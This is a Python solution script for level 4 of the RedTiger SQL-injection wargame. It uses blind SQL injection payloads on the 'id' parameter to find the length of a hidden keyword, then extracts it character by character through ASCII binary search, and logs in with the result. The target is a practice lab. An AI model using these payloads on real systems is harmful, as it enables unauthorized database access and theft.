#!/usr/bin/env python3
import tigers as tg
import tiger_cookies


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return '1 rows' in args[0]


def main():
    """
    Blind SQL Injection.

    Target: Get the value of the first entry in table level4_secret in column keyword

    Disabled: like
    """
    base_name = 'level4_secret'
    url = "https://redtiger.labs.overthewire.org/level4.php"
    finds = 'keyword'  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level4login'
    method = 'get'
    inj_param = 'id'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level4login=cooks[level])

    # Find len of key
    payload = f"1 and if((select length({finds}) from {base_name})>%s, 1, 0)"
    p = tg.SqlInjection(url, cook, method, inj_param, payload, check_clear=pass_r)
    len_of_key = p.find_key_len(check_func)

    # Find key
    p.payload = f"1 and if((select ascii(mid({finds},%d,1)) from {base_name})<%s, 1, 0)"
    key = p.find_binary(check_func, len_of_key)

    # Authorization
    other_param = {'secretword': key, 'go': 'Go!'}
    p.inj_param = ''
    p.other_param = other_param
    p.method = 'post'
    response = p.my_request()

    # Еxtracting data from html
    passw = p.extract_pass(response)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
